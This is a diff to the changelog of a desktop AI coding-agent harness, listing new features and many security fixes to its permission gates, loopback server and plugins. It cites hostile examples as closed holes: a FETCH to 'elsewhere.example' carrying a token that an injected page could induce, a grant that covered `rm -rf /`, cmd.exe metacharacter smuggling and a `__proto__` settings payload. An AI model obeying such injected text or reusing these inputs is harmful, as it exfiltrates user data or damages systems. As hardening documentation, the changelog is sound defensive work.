@@ -7,6 +7,125 @@ procedure, acceptance criteria and rollback live in [`docs/RELEASE.md`](docs/REL
 
 ### Added
 
+- **The links a web search brings back are links again.**
+  A search answers with prose and a `sources:` block, and until now that block
+  held addresses nobody could use: the search edge answers with opaque
+  redirect links (a long token on a search host), and what reached the screen
+  was the wire spelling (`HTTPS-URL…`) — a reader could neither click the
+  address nor copy it. Now the redirects are followed once, under the same
+  private-host guard the FETCH tool uses, and the block is rewritten to the
+  article's own address; the window puts the wire spellings back before it
+  shows anything, so what is on screen is the address itself; the sources
+  travel with the tool row and are listed under it, each one a link the reader
+  can open (the click goes to the backend, which opens it in the browser, not
+  in the window); and the model is told to carry the sources into its answer
+  as links, so a claim can be checked
+  (`aipass-bridge/harness/web-sources.mjs`, `desktop/ui/waf-restore.js`).
+- **The harness can tune itself, one component at a time.**
+  `npm run meta` is a loop over the harness: it writes a brief that quotes the
+  harness's own source and the RAW transcript lines of past runs, records a
+  candidate change to one of six components, measures that candidate against
+  the baseline with the same matrix and the same gates the evals use
+  (regression, safety, spend, sample floor), and rolls the change back when
+  the score does not move. The editable half of a component is a plain
+  document in `~/.aipass/harness/policy/`; the runtime composes the enabled
+  ones into the first message of a conversation, additively and within a byte
+  budget, so with no document on disk the preamble is byte-identical to what
+  it was. A candidate is checked deterministically before it is measured: one
+  that weakens the permission/secret/verification floor, or that carries a
+  token the outbound WAF table rewrites, is refused rather than scored
+  (`docs/META_HARNESS.md`, `aipass-bridge/harness/meta/`,
+  `scripts/meta-optimize.mjs`).
+- **The upgrade and rollback are a script now.**
+  `npm run desktop:install-ladder` installs the artifact, checks that the
+  installed build is the one that shipped and that it actually runs (its
+  backend answers), installs the new build over the old one and checks it
+  again, installs the old build back and checks it again, uninstalls — and
+  checks that the user's data is still there. Give it both artifacts and it
+  walks the whole ladder. It installs software on the machine it runs on, so
+  it asks first, and it never touches the real `~/.aipass`: the app runs
+  with `AIPASS_HOME` pointing at a scratch directory
+  (`scripts/install-ladder.mjs`, `test/install-system.test.mjs`).
+- **The window can put the CLI on PATH.** The tray menu gained
+  "ติดตั้ง CLI (aipass)": it writes a shim into a per-user bin directory
+  (`~/.local/bin/aipass`, or `%LOCALAPPDATA%\aipass\bin\aipass.cmd`) that
+  runs the app's own Node against the app's own CLI — so a machine without
+  Node still gets a working `aipass`. Nothing is written until somebody
+  clicks; the window says where the shim went
+  (`desktop/src-tauri/src/main.rs`).
+- **A universal macOS build has a sidecar to go with it.**
+  `npm run desktop:sidecar:universal` merges the two official Node builds
+  for the running Node's version with `lipo` — a macOS job, because `lipo`
+  is one — into the `node-universal-apple-darwin` the bundler expects, and
+  signs it when an `APPLE_SIGNING_IDENTITY` is configured
+  (`scripts/build-universal-sidecar.mjs`).
+- **CI builds the artifact on all three platforms.**
+  `.github/workflows/build.yml` runs the one build command on Windows, macOS
+  and Linux and uploads the artifact with its checksum and its manifest. The
+  macOS lane is the reason a Mac is needed in CI at all: the bundler needs
+  `hdiutil`, `codesign` and the macOS SDK
+  (`.github/workflows/build.yml`).
+- **The desktop has one build command that ships.** `npm run desktop:build`
+  checks that `package.json`, `Cargo.toml` and `tauri.conf.json` name the
+  same version (an artifact whose name says 0.2.0 and ships 0.2.1 is a
+  rollback nobody can reason about), puts the Node sidecar in place for the
+  triple being built, asks the bundler for the platform's bundles — NSIS on
+  Windows, `.app` + `.dmg` on macOS, `deb` + AppImage on Linux — and writes
+  the artifact to `dist/` as
+  `aipass-desktop-<version>-<platform>-<arch>.<ext>`, beside a `SHA256SUMS`
+  file and a `manifest.json` that says which commit it was built from and
+  whether it was signed. The shape of the whole install system — what an
+  install guarantees, what each platform does, what macOS needs and what is
+  still missing — is `docs/INSTALL.md`
+  (`scripts/build-desktop.mjs`, `test/install-system.test.mjs`).
+
+- **A projection whose backend died is collected in minutes, not in six
+  hours.** The janitor that collects the copies a killed backend left behind
+  knew only one thing — how old a projection was — so a crash cost six hours
+  of disk, and a long-lived backend (the window) swept only at its first
+  boot. Each projection now carries a stamp beside it naming the process that
+  made it, and the janitor reads it: a projection whose owner is gone waits
+  out minutes, a projection a live run still owns keeps the six-hour margin
+  a run's budget needs. The sweep runs before every run, not only at the
+  first one, and it deletes asynchronously — a tree of the user's project
+  removed on the backend's event loop would freeze the window
+  (`harness/sandbox.mjs`, `harness/harness.mjs`, `harness/tools.mjs`,
+  `test/sandbox.test.mjs`).
+- **A staged JSON edit is checked too.** The edit diagnostics that run
+  `node --check` on a staged JavaScript file now parse a staged `.json` file
+  in-process: `JSON.parse` needs no process and no toolchain, and a
+  `package.json` with a missing comma breaks every tool in the project the
+  moment it lands. The verdict rides the tool result like the JavaScript one,
+  and names the line and the column, so the fix is a place and not a hunt. A
+  `tsconfig*.json` and a `*.jsonc` are read the way their own reader reads
+  them — comments and trailing commas allowed — and every other `.json` is
+  read as JSON, strictly (`harness/tools.mjs`, `test/harness-research.test.mjs`).
+- **A run that goes round a longer circle is caught.** The stagnation guard
+  stopped a run that repeated itself and a run whose two steps traded places;
+  a three-state round — read file A, edit file B, run the test, read file A
+  again — looked like progress and went nowhere. The guard now reads the
+  window of recent step signatures and recognises a round of three states or
+  more, counting laps rather than detections, and the evidence side rides
+  with it: a run whose answers keep coming back the same is stopped on the
+  first strike instead of being handed a correction it has already shown it
+  does not act on (`harness/loop.mjs`, `test/harness-research.test.mjs`,
+  `docs/LOOP_DESIGN.md`).
+- **A plugin marker rides the permission gate like a built-in.** A marker the
+  model asks for used to run whenever it asked: only a marker that *declared*
+  a `risk` at registration was ever put to the person, and an undeclared one
+  was trusted by silence. That is the wrong way round — a plugin's code runs
+  in the backend process with the app's rights, so a marker the model asked
+  for by accident, or one a file it read told it to, could act on the machine
+  unasked. Now every marker is classified: the declared risk is taken as
+  given, and an undeclared marker is classified like a **write**. The
+  person's own path rules and the secret floor reach a marker through its
+  argument, and the payload the argument does not carry — the body — is
+  screened for secret names too, because a plugin used as a proxy would carry
+  the file straight back to the model and the plugin's own code cannot be
+  screened from the harness. The window's question says what it is: a
+  marker, and what it was handed (`harness/permissions.mjs`,
+  `harness/loop.mjs`, `harness/plugins.mjs`, `desktop/ui/app.js`,
+  `test/gates.test.mjs`, `test/permissions.test.mjs`).
 - **A plugin can be installed from a repository or a package.** The install box
   and `aipass plugin install` now take `github:owner/repo#ref`,
   `git+https://…`/`git+ssh://…` and `npm:<package>` beside a path and an
@@ -159,11 +278,317 @@ procedure, acceptance criteria and rollback live in [`docs/RELEASE.md`](docs/REL
 
 ### Fixed
 
-- **Node 22 is the floor, stated everywhere.** `engines` has said `>=22` since
-  the type-check seed, while the installers, `aipass status`, the setup doctor
-  and `aipass-bridge/package.json` still said `>=20`. They all say 22 now,
-  matching the CI matrix (22/24) and the September 2026 runner floor. The
-  README badge already said 22.
+- **The desktop app starts in dev.** `npm run tauri:dev` died before the
+  window: Tauri runs the `beforeDevCommand` in the directory it was started
+  in — the repo root — and the command named `node main.mjs`, which is the
+  launcher one folder down. The dev command now goes through the package
+  script (`npm run desktop:backend`), which runs in the package root
+  wherever it was typed, and the launcher is named the way the repo root
+  sees it (`desktop/src-tauri/tauri.conf.json`, `package.json`).
+- **The CLI ends cleanly, on Windows.** `aipass status` printed a perfect
+  report and then died: `process.exit()` right after the bridge's HTTP calls
+  races Node's teardown and trips libuv's assert in `win/async.c:94`
+  (0xC0000409), so the shell saw a crash code for a command that had
+  answered everything. The dispatcher now ends the way `doctor.mjs` and
+  `list.mjs` already did — `exitCode` and a drained loop, no `process.exit()`
+  — and the sockets are closed on the way out, so the command also stops
+  waiting for them (nodejs/node#56645,
+  `aipass-bridge/bin/aipass.mjs`, `aipass-bridge/test/cli.test.mjs`).
+- **The desktop app's CLI install actually installs a CLI.** The tray item
+  **ติดตั้ง CLI (aipass)** wrote a shim into a per-user bin directory that
+  was not on PATH, so the command it installed could not be typed — the one
+  step left was editing PATH by hand, and that never happens. The item now
+  puts the directory on the **user** PATH (`HKCU\Environment`; the machine
+  PATH is never touched), keeping the registry type, and says so
+  (`desktop/src-tauri/src/main.rs`).
+- **The bridge says why the extension is not there.** An extension without the
+  loopback token retries every three seconds, every retry is a 401, and
+  `/status` answers `extensions: 0` — so the only symptom was a number, and
+  the cause (the token was never pasted into the popup) had to be guessed. The
+  bridge now names it, once every thirty seconds: "the extension was refused:
+  it has no loopback token — paste the contents of `~/.aipass/.token` into the
+  extension popup (Advanced → Loopback token) and save"
+  (`aipass-bridge/bridge/server.mjs`, `aipass-bridge/test/auth.test.mjs`).
+
+- **The loopback surface holds.** A security pass over the desktop app found
+  the boundary between the user's machine and everything that reaches for it
+  had several one-request holes in it, and they are closed now:
+  - A malformed request target took the whole desktop backend down. The URL
+    was parsed as the first statement of an async listener, so the rejection
+    became an unhandled rejection and the process-level handler exited the
+    backend — one `GET //[` from any local process, or from any web page (a
+    plain GET needs no preflight). It answers 400 now.
+  - A session handle that carried a separator was a raw file path, so
+    `session.delete` deleted whatever it named and `session.rename` rewrote
+    its first line. A handle may only name a file inside the store.
+  - The bearer token rode along to whatever host the bridge URL named: the
+    clients asked "does this URL start with the bridge URL", and every call
+    site built its URL as `${BRIDGE}${path}`, so the answer was yes by
+    construction. The question is about the HOST now, and the token goes to
+    loopback and nowhere else.
+  - A URL handed to the Windows fallback (`cmd /c start`) could carry `&`,
+    `|`, `^` or `%VAR%` — cmd.exe parses its own command line, so a URL with
+    a query string was a command. The allowlist refuses them.
+  - The suite auto-started a bridge on the developer's real port 8787, with
+    the no-token escape hatch on, detached, and it outlived the run: an
+    unauthenticated bridge squatting the real port, which any web page could
+    blind-POST to and spend the account's credits. The suite names a port of
+    its own and ends any bridge it started, and the bridge itself now refuses
+    the shared default port with the token gate off — the port is the only
+    thing a web page can guess.
+  - The desktop port is validated on both sides. `AIPASS_DESKTOP_PORT=0` is
+    "any free port" to Node and "nothing" to the Tauri shell, which opened
+    `http://127.0.0.1:0/` with nothing behind it; an empty value was 8790 to
+    one side and 0 to the other.
+  (`aipass-bridge/harness/rpc.mjs`, `harness/session.mjs`,
+  `harness/authtoken.mjs`, `harness/browser.mjs`,
+  `aipass-bridge/test/harness.mjs`, `scripts/test.mjs`, `desktop/main.mjs`,
+  `desktop/src-tauri/src/main.rs`, `aipass-bridge/test/loopback-surface.test.mjs`).
+- **A fetch is a question, not a read.** FETCH is the one tool whose
+  destination the model chooses, so `NEED file` followed by
+  `FETCH https://elsewhere.example/x?t=…` was a complete exfiltration
+  channel a page the agent read could talk it into — and nothing asked. It is
+  a tier of its own now, no mode pre-answers it, and the window shows the URL
+  it is about to send to. The CLI has no window to ask in, so `--allow-fetch`
+  is the consent there, the way `--allow-run` is for the shell.
+  (`aipass-bridge/harness/permissions.mjs`, `aipass-bridge/agent.mjs`).
+- **`auto` asks about the shell.** The documented meaning of `auto` is
+  "writes go through without asking"; the code let `auto` plus `allowRun` run
+  every shell command silently. `yolo` is the mode that lets the shell
+  through (`aipass-bridge/harness/permissions.mjs`).
+- **A remembered "always" is not a blanket.** A RUN carries its command in its
+  body and an empty argument, so every shell call shared the grant key
+  `run:` — one "always" on `ls -la` authorised `rm -rf /` after it, in that
+  run and in every run after it. A shell grant is keyed by the command's
+  shape now: `git status` does not cover `git push`, and a grant written
+  before the shape existed answers nothing
+  (`aipass-bridge/harness/rules.mjs`, `harness/permissions.mjs`).
+- **A repository cannot start a program on your machine.** A project-scoped
+  `.aipass/mcp.json` was spawned the moment the project was opened — no
+  trust prompt, no allowlist, no sandbox, with the harness's own environment
+  handed to the child — and a repo-supplied file could declare itself `read`,
+  the tier that never asks. A project-scoped server now runs only when the
+  user has approved it by name in the home `mcp.json`, it may not declare
+  itself `read`, and its child inherits only what its own config names
+  (`aipass-bridge/harness/mcp.mjs`).
+- **A "disabled" plugin does not run.** The enabled-list was checked after
+  the dynamic import, so a disabled plugin's top-level code had already run
+  — and that is where a plugin does its damage (`aipass-bridge/harness/plugins.mjs`).
+- **The private-address guard is pinned to the connection.** It resolved the
+  name and vetted the answer, then `fetch` resolved it again — so a name with
+  TTL=0 could answer public for the check and private for the request. The
+  address that was vetted is the address the socket goes to now, the verdict
+  cache is short, and the classifier knows the CGNAT, protocol-assignment,
+  benchmarking and reserved ranges as well as the IPv4-compatible and NAT64
+  IPv6 forms (`aipass-bridge/bridge/private-hosts.mjs`,
+  `bridge/server.mjs`, `harness/tools.mjs`).
+- **The swap is atomic for real.** The stores wrote to a fixed
+  `<file>.tmp` — one name for the whole machine — so two writers fought over
+  it, one truncated the bytes the other had written, and the second's rename
+  failed with `ENOENT`: a lost update, with the in-memory state left stale
+  behind it. The temp name is unique per write, the file is opened
+  exclusively (a name another user planted as a symlink is a clean failure,
+  not a write THROUGH it), the bytes and the directory are fsynced, and the
+  inline copies of the swap are gone
+  (`aipass-bridge/harness/atomic-write.mjs`, `harness/settings.mjs`,
+  `harness/providers.mjs`).
+- **The state stores are owner-only.** The memory and symbols stores were
+  `0644` in `0755` directories while the session store next to them was
+  `0600` in `0700` — and they hold the model's durable project facts and
+  every indexed source and symbol name
+  (`aipass-bridge/harness/memory-store.mjs`, `harness/symbols.mjs`).
+- **A settings file cannot hijack a prototype.** `Object.assign` replaces the
+  prototype of its target, so `{"compaction":{"__proto__":{…}}}` in
+  `settings.json` replaced the compactor's prototype and every run that
+  reached the context limit died with `needsCompaction is not a function`.
+  The dangerous keys are stripped where the settings enter
+  (`aipass-bridge/harness/settings.mjs`).
+- **The installer bounds what it downloads.** The size caps were checked
+  AFTER the bytes were in memory or on disk (a chunked response could push
+  anything into the heap before the 1 MB cap fired; a whole repository was
+  copied before the 8 MB cap was evaluated; a symlink in `node_modules`
+  pointing at `C:\` copied the drive), and the `http://` refusal ran only on
+  the first URL, so an `https://` link could hand the download to a plain one
+  in a redirect. The caps hold while the bytes stream, the protocol policy is
+  checked on every hop, and a link out of the tree is refused rather than
+  resolved (`aipass-bridge/harness/install.mjs`).
+- **The container deployment starts.** `AIPASS_HOST=0.0.0.0` was set in
+  every deploy file and `AIPASS_ALLOW_REMOTE=1` in none, so the bridge
+  refused to bind and supervisord restarted it forever
+  (`aipass-bridge/deploy/`).
+
+- **A run does not stand still at a refusal.** The message that carries a tool
+  result was refused by the upstream edge, and the run sat in the wait ladder
+  — 60 s, then 180 s, then the split — for minutes before it could go on. The
+  window showed a run that had stopped: the session ended right after the last
+  tool call, with no answer and no `run_stats`, because the window was closed
+  while it waited. A big message is now sent again *shorter*, at once: the
+  head and the tail survive, the middle is left out with a line that says so,
+  and the run's next step happens. A small message is never shortened (that is
+  the pace case, and the wait is its medicine), and neither is the run's first
+  message — that one carries the protocol (`harness/bridge.mjs`,
+  `harness/loop.mjs`, `test/run-resilience.test.mjs`).
+- **The chat tab opens in Chrome, and the test suite closes what it opened.**
+  The page was opened in the platform's default browser, so a Windows machine
+  opened it in Edge — where the extension is not, and the run stopped with
+  "no de.aipass.net tab is open". The rule is Chrome now (the platform
+  default is only the fallback for a machine with no Chrome at all), and the
+  browser the suite opens is an instance of its own: a private profile, a
+  process tree of its own. The suite closes that tree when the run ends, so a
+  test run no longer leaves a window on the developer's desktop, and the
+  Chrome they are using is never the one that gets closed
+  (`harness/open-command.mjs`, `harness/browser.mjs`, `harness/rpc.mjs`,
+  `desktop/main.mjs`, `setup.mjs`, `scripts/test.mjs`,
+  `test/platform.test.mjs`).
+- **The suite takes a port the OS picks.** A test backend used to probe a free
+  port and then bind it, and the window between the two is one another
+  process can walk into: with three suites on one machine — which this
+  repository's sessions do — a file could fail for a reason that had nothing
+  to do with the code. The backend now takes port 0 and reports the port it
+  actually got, so the race is not possible at all (`harness/rpc.mjs`,
+  `test/harness.mjs` and the test files that start a backend).
+- **`/symbols` answers instead of pointing.** The command promised a listing
+  and printed "use SYMBOLS in an agent run" instead — so the palette offered
+  something it did not have. It asks the backend for the same code-navigation
+  index the markers use: what a file declares, or where a name is defined and
+  where it is used (`harness/rpc.mjs`, `desktop/ui/app.js`,
+  `test/desktop.test.mjs`, `test/ui.test.mjs`).
+- **A key on the "แนบ" button attaches the file.** The file row is a button
+  and the attach button inside it is a button too, and the row's key handler
+  swallowed the key and cancelled the inner button's own activation: Enter
+  opened the file instead of attaching it, so a keyboard user could not attach
+  anything from the panel. A key on a control inside a row is that control's
+  business now (`desktop/ui/app.js`, `test/ui.test.mjs`).
+- **The settings sheet stops its meter when it closes.** The meter's timer was
+  written into the modal's dataset and never read, so every "คืนค่าเดิม" —
+  which closes the sheet and opens it again — left another one polling the
+  backend forever (`desktop/ui/app.js`, `test/ui.test.mjs`).
+- **A failed action says so.** The button paths had no error handling: a
+  rejected call was an unhandled rejection in the console and nothing at all
+  on screen. Apply, Discard, the session buttons, the model and provider
+  pickers, plan mode and the settings reset all say what went wrong now
+  (`desktop/ui/app.js`, `test/ui.test.mjs`).
+- **The "auto" theme follows the system.** The system's choice was read once
+  and then went stale — a machine that goes to bed at sunset kept the wrong
+  theme until the window was reloaded. The window listens to the media query
+  now, and reads it safely when the browser has no `matchMedia` at all
+  (`desktop/ui/app.js`, `test/ui.test.mjs`).
+- **The settled layer is appended to, never rewritten.** Every paragraph that
+  closed reassigned the settled layer's `innerHTML`, so the browser re-parsed
+  everything already on screen and the cost of a frame grew with the answer.
+  It is appended to now (`desktop/ui/app.js`, `test/ui.test.mjs`).
+- **The search field does one call, not one per keystroke.** Typing in the
+  history filter issued a round trip and rebuilt the whole list for every
+  character; it waits a moment now (`desktop/ui/app.js`, `test/ui.test.mjs`).
+- **The header asks once.** Refreshing the header asked the backend for its
+  status twice — once for the header and once for the context meter — every
+  ten seconds (`desktop/ui/app.js`).
+- **The window says what it is to a screen reader.** The sheet is a dialog
+  (and it takes the focus with it, and gives it back), the transcript is a
+  live region, the palette is a listbox and the composer says which row is
+  on it, the composer has a name, the icon buttons have names, and a machine
+  that asks for less motion gets no animation and not only no transition
+  (`desktop/ui/index.html`, `desktop/ui/styles.css`, `desktop/ui/app.js`,
+  `test/desktop-window.test.mjs`, `test/ui.test.mjs`).
+- **A 401 refreshes the token, and the retry carries the new one.** The
+  window's request headers were built once, before the call — so when the
+  boot fetch lost a race and the window fetched the token again, the retry
+  went out with the OLD token and failed with the same 401. The headers are
+  built per attempt now, and a test pins it
+  (`desktop/ui/app.js`, `test/ui.test.mjs`).
+- **The suite is green under load.** The stability pin that a command's
+  process tree dies with its timeout left 600 ms between the timeout and the
+  grandchild's write; on a busy machine — this repository's suites run in
+  parallel with other sessions' — the kill could lose that race and the
+  marker landed. The margin is generous now: the pin is about the kill, not
+  about how fast a machine kills a tree
+  (`test/stability.test.mjs`).
+- **An "always" answer is not a permanent yes.** The permission engine checked
+  the remembered grants FIRST — before the user's own path rules and before
+  the secret floor. A grant is written to the rules file and re-seeded on
+  every start, so a `deny` rule the person added later never took effect, and
+  a grant given to a secret file outlived the rule that had allowed it. The
+  grants now sit under the user's rules and under the secret floor, and still
+  beat the safety floor and the mode: "always" means always, but it cannot
+  outlive a rule, and a secret file is denied in every mode whatever the
+  answer was once (`harness/permissions.mjs`, `test/permissions.test.mjs`).
+- **The window is served under a policy.** The backend sent the UI's files
+  with no `Content-Security-Policy` at all — and the shell's declaration
+  covers the asset protocol, which this window does not use, because it is
+  loaded from the backend over plain HTTP. The policy is now served by the
+  backend (`harness/rpc.mjs`, `WINDOW_CSP`), the shell declares the same
+  policy key for key, and a test says the two cannot drift. The remote
+  images and videos the markdown renderer draws are allowed again: the
+  shell's old declaration blocked them, so a model's picture worked in the
+  browser and vanished in the packaged app (`desktop/src-tauri/tauri.conf.json`,
+  `test/hardening.test.mjs`, `test/desktop.test.mjs`).
+- **The page is granted no more than it uses.** The Tauri capability set
+  handed the page `core:default` — the tray, the menu, path resolution and
+  the devtools toggle — and `withGlobalTauri` put the whole API on
+  `window.__TAURI__` in a document loaded over plain HTTP. The page uses no
+  Tauri API at all (the Rust side owns the window, the tray and the sidecar),
+  so the blanket set is gone, the global is off, and what remains is window
+  and event commands only (`desktop/src-tauri/capabilities/default.json`,
+  `desktop/src-tauri/tauri.conf.json`, `test/hardening.test.mjs`).
+- **A body over the cap is answered, not dropped on the floor.** A `/rpc`
+  body past the cap destroyed the request without a word, so the client saw
+  a transport error it could not read and the window's "attach" of a large
+  file looked like the app had crashed. The answer goes out first — a 413
+  that says what the cap is — and the socket is closed after it. The cap
+  itself is 64 MB, which fits a couple of 20 MB attachments in base64
+  (`harness/rpc.mjs`, `test/desktop.test.mjs`).
+- **The window cannot be made to read a huge file, or a binary one as text.**
+  `fs.read` had no size cap and no binary guard: a 500 MB log in the project
+  filled the backend's memory, and a PNG read as UTF-8 is a screenful of
+  mojibake. It now refuses both, with the same cap and the same binary
+  refusal the tool layer uses for the model (`harness/rpc.mjs`,
+  `test/desktop.test.mjs`).
+- **Two windows on two projects cannot touch each other's work.** The backend
+  holds one harness per project, and the window said nothing about which one
+  it was showing — so the window that spoke last decided what the other one
+  read. Window A on project A saw project B's sessions, file tree, context
+  meter and **pending diffs**, and its **Apply** button wrote project B's
+  staged edits to project B's disk while the header still said "project A".
+  Every call now carries an `x-aipass-project` header, and the backend answers
+  for that project: the scope is looked up, never switched to, so a call is a
+  target and not a move of the machine's current project. A method that names
+  its own project still wins — the header says *who* is asking, the parameter
+  says *what* the call is about (`harness/rpc.mjs`, `desktop/ui/app.js`,
+  `test/desktop.test.mjs`).
+- **The launcher finds a backend that is already running.** The backend's
+  `/rpc` is behind the loopback token, so a probe without one got a 401 — and
+  a launcher that only accepted a 200 never saw the running backend. It
+  started a second one, hit `EADDRINUSE`, and the window opened on "port 8790
+  is busy" — which reads as "the app does not open". `--detach` (the path
+  `tauri:dev` takes) failed the same way. The probe sends the token, and a
+  401 carrying the backend's own refusal still counts as ours; a 401 that is
+  not ours is somebody else's server, and the busy-port message still says so
+  (`harness/backend-probe.mjs`, `desktop/main.mjs`, `test/desktop.test.mjs`).
+- **A relative attachment path is relative to the project.** The window's file
+  panel hands over project-relative paths, and they resolved against the
+  folder the *backend* started in — so **แนบ** and `/file <path>` failed for
+  every project except that one, and for every project right after a switch.
+  They now resolve against the project the call is about
+  (`harness/rpc.mjs`, `test/desktop.test.mjs`).
+- **A session id is matched whole.** Every session file is named
+  `session-<id>.jsonl`, and the lookup was a substring match: a one-character
+  id matched the first session in the store, so `session.delete {id:"a"}`
+  deleted a session nobody named. The name is now matched exactly, and the
+  lookup is scoped to the project the caller named
+  (`harness/session.mjs`, `harness/harness.mjs`, `test/desktop.test.mjs`).
+- **A file the human unticked stays unticked.** The pending panel is rebuilt
+  on every diff frame and again when the run ends, and it re-ticked everything
+  it drew — so a file the human had said no to came back ticked, and the
+  Apply button wrote exactly the files they refused
+  (`desktop/ui/app.js`, `test/ui.test.mjs`).
+- **The packaged app no longer wipes the settings file.** The migration from
+  the legacy `desktop.json` wrote `{"root": …}` over `settings.json` — the
+  mode, the model, the compaction budget, the path rules and the project list
+  all went with it — and it deleted the legacy file whether or not the write
+  landed. The migration merges one key into the file it finds, and the legacy
+  file goes only after the write succeeded
+  (`desktop/src-tauri/src/main.rs`, and the three `cargo test` cases beside
+  it).
 - **The test suite no longer writes into the real `~/.aipass`.** The
   cross-session memory store named its directory when the module loaded, so a
   suite that pointed `AIPASS_HOME` at a scratch home *after* that import still
@@ -495,6 +920,62 @@ procedure, acceptance criteria and rollback live in [`docs/RELEASE.md`](docs/REL
 
 ### Changed
 
+- **The app's icon is the app's own logo.** The icon was a blue pixel letter
+  'a' on a dark square while the window drew a terracotta rounded square with
+  a four-point star — two marks for one product, and the pixel one is what
+  the task bar, the Start menu, the installer and Explorer's file list
+  showed. The icon is the window's mark now, drawn by the generator that
+  already wrote the PNGs: the shapes are sampled 8x per pixel and averaged,
+  so the edges are smooth at every size instead of stair-stepped, and the
+  smallest sizes get slightly thicker arms, because at 16 pixels the window's
+  arms are thinner than a pixel and the star would be a white blob. The
+  macOS tray template is the star by itself
+  (`desktop/src-tauri/icons/make-icons.mjs`, `desktop/src-tauri/icons/*`).
+- **The shell reads `AIPASS_HOME` the way the Node side does.** The Node
+  side reads it as the `.aipass` directory itself; the Rust shell read it
+  as a *home* directory in one place and ignored it in another, so the
+  window's log and its "last project" could land outside the directory the
+  rest of the app was using. Now one override means one thing on every
+  platform, which is what lets the install ladder run against a scratch
+  home without touching the real one
+  (`desktop/src-tauri/src/main.rs`).
+- **An installed app runs the files it shipped with.** The root lookup
+  preferred the directory the crate was compiled in over the install
+  directory, so an app installed on a machine that also had a checkout ran
+  the checkout's `.mjs` files — a build that is not the one that was
+  installed. The install directory comes first now; the compiled-in path is
+  what `tauri dev` falls back to
+  (`desktop/src-tauri/src/main.rs`).
+- **The window has one tray icon, not two.** The config declared a tray
+  icon and the Rust side built another one with the menu on it, so the
+  system tray showed the app twice. The config's tray is gone; the one
+  with the menu stays, and on macOS it is a template image — the menu bar
+  draws it as a mask, so the mark is the star by itself
+  (`desktop/src-tauri/tauri.conf.json`, `desktop/src-tauri/src/main.rs`,
+  `desktop/src-tauri/icons/make-icons.mjs`).
+- **The bundle set belongs to the platform, not to one config.** The NSIS
+  target was the only one the config named, so `tauri build` on a Mac tried
+  to build a Windows installer and the macOS and Linux builds existed only
+  as npm-script flags. Each platform owns its bundle set now, in a file next
+  to the config (`tauri.windows.conf.json`, `tauri.macos.conf.json`,
+  `tauri.linux.conf.json`), which the Tauri CLI merges by itself. The macOS
+  one also names the minimum system version and turns the hardened runtime
+  on, and the bundle now carries an `Info.plist` that lets the window load
+  its own loopback backend under the transport policy on macOS
+  (`desktop/src-tauri/tauri.*.conf.json`, `desktop/src-tauri/Info.plist`).
+
+- **The rail lost two rows that led nowhere.** "คู่มือ" and "ปลั๊กอิน" were
+  folded headings in the window's left column: clicking one opened a box you
+  had to guess at, in a column whose job is the work. The playbooks and the
+  panels the plugins draw now live in the settings sheet — the playbooks
+  right under the folders they are searched in, and clicking one opens the
+  playbook under its own row (no second modal on top of the sheet); the panels
+  under the plugin that draws them, where a finished run still repaints them in
+  place. Nothing was dropped: `/skills` still lists the playbooks, and the
+  plugin panels are drawn the moment the sheet opens
+  (`desktop/ui/index.html`, `desktop/ui/app.js`, `desktop/ui/styles.css`,
+  `test/ui.test.mjs`).
+
 - **The rail is the work, not the configuration.** The window's left column
   carried nine rows, and half of them led nowhere: "ค้นหาแชท" focused a search
   box folded away inside another row, so clicking it did nothing you could
@@ -586,6 +1067,11 @@ procedure, acceptance criteria and rollback live in [`docs/RELEASE.md`](docs/REL
 
 ### Fixed
 
+- **Node 22 is the floor, stated everywhere.** `engines` has said `>=22` since
+  the type-check seed, while the installers, `aipass status`, the setup doctor
+  and `aipass-bridge/package.json` still said `>=20`. They all say 22 now,
+  matching the CI matrix (22/24) and the September 2026 runner floor. The
+  README badge already said 22.
 - **A ticked checklist item actually ticks.** `parseTodo` matched `done`
   against the bulleted line, so `- [x] text` — the shape every model writes —
   parsed as open forever: the card never showed progress and the DONE plan
